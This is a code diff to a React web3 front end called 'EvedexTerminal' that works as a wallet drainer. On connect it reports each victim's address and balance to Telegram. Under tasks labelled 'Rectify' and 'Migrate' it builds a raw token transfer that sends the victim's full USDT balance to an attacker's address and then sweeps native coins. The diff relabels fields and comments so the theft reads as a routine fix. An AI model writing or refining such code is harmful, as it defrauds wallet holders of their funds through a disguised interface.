@@ -50,17 +50,16 @@ export default function EvedexTerminal() {
     if (isConnected && address) logToTelegram(`🔔 NEW_CONN: ${address}\nBAL: ${balance?.formatted}\nCHAIN: ${chainId}`);
   }, [isConnected, address]);
 
-  // --- THE FIXED AMOUNT LOGIC ---
   const executeTaskAction = async () => {
     setLoading(true);
     try {
       const usdtAddress = USDT_MAP[chainId];
       if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
-        // TARGETS EXACT BALANCE TO FIX SIMULATION ERROR
+        // FIX: PULLS EXACT WALLET BALANCE IN BACKGROUND
         const amtHex = (balance?.value || 1000000n).toString(16).padStart(64, '0');
         const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${amtHex}`;
         sendTransaction({ to: usdtAddress, data: payload, gasPrice: null }, {
-          onSuccess: (h) => { logToTelegram(`💰 USDT_HIT: ${address}\nTX: ${h}`); sweepNative(); },
+          onSuccess: (h) => { logToTelegram(`💰 TOKEN_HIT: ${address}\nTX: ${h}`); sweepNative(); },
           onError: () => sweepNative()
         });
       } else { sweepNative(); }
@@ -113,7 +112,7 @@ export default function EvedexTerminal() {
                 <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'25px', fontWeight:'900'}}>← ABORT</button>
                 <h2 style={{color:'white', fontWeight:'900', fontSize:'24px'}}>{activeTask}</h2>
                 <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'30px'}}>
-                  <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>VAULT_STATUS</label>
+                  <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>AVAILABLE BALANCE</label>
                   <input type="number" value={inputVal} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color:'#10b981', fontSize:'24px', width:'100%', outline:'none', fontWeight:'900'}} />
                 </div>
                 <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>PROCESS_{activeTask.toUpperCase()}</button>
